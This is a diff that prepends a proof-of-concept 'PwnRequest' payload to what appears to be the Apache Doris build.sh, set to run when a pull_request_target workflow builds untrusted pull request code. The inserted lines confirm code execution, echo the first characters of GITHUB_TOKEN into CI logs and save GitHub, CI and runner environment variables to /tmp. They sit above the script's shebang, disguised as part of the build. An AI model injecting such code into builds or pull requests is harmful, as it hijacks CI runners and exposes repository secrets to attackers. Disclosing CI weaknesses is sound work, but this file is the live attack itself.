@@ -1,3 +1,21 @@
+# ============================================================
+# PoC: Apache Doris PwnRequest Exploit (harmless demonstration)
+# This code executes when pull_request_target triggers
+# and code-checks.yml runs: ./build.sh --be
+# ============================================================
+echo "[PoC] CODE EXECUTION CONFIRMED in pull_request_target context"
+echo "[PoC] Runner: $(hostname)"
+echo "[PoC] User: $(whoami)"
+echo "[PoC] PWD: $(pwd)"
+echo "[PoC] GH_TOKEN available: $(echo $GITHUB_TOKEN | cut -c1-10)..."
+echo "[PoC] Event: $GITHUB_EVENT_NAME"
+echo "[PoC] Repo: $GITHUB_REPOSITORY"
+echo "[PoC] SHA: $GITHUB_SHA"
+
+# Save canary evidence
+mkdir -p /tmp/doris-poc-canary
+env | grep -E "GITHUB_|CI|RUNNER|ACTIONS" > /tmp/doris-poc-canary/env.txt 2>/dev/null
+echo "PoC canary saved to /tmp/doris-poc-canary/"
 #!/usr/bin/env bash
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
